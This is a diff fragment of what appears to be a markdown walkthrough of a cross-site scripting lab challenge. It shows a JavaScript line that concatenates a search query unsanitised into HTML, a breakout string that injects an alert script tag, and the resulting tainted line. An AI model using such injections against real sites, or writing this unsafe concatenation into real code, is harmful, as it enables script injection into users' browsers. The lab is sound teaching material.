@@ -18,16 +18,19 @@ description: "Cross-Site Scripting Ep.4 – D - A walkthrough of the challenge w
 ![image2](../resources/5ab24e8e01f04e53aafdcb9682f2fef3.png)
 
 **<u>Original query:</u>**
+
 ```bash
 var tracker = '<div hidden><img src="/resources/search_assets/search.gif?query=' + query + '"></div>'
 
 ```
 **<u>Inject the following:</u>**
+
 ```bash
 '"\>\<script\>alert('XSS')\</script\>\<"'
 
 ```
 **<u>Malicious query:</u>**
+
 ```bash
 var tracker = '<div hidden><img src="/resources/search_assets/search.gif?query=' + '"><script>alert('XSS')</script><"' + '"></div>'
 
